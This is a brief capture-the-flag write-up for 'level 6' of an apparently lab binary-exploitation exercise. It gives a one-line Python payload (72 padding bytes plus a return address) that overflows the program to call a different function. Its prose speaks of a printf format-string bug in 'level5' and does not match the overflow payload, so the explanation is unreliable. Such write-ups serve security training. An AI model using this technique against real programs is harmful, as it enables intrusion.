## LEVEL 6 HELP

the level5 binary make call to printf with format directly used in, without any protection which make it vulnerable, we just need to know where we can access memory throught the print and exploit it to edit the call function to n instead of m

### USAGE

```bash
./level6 [input]
```

## SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
./level6 $(python -c 'print("a"*72 + "\x54\x84\x04\x08")')
```
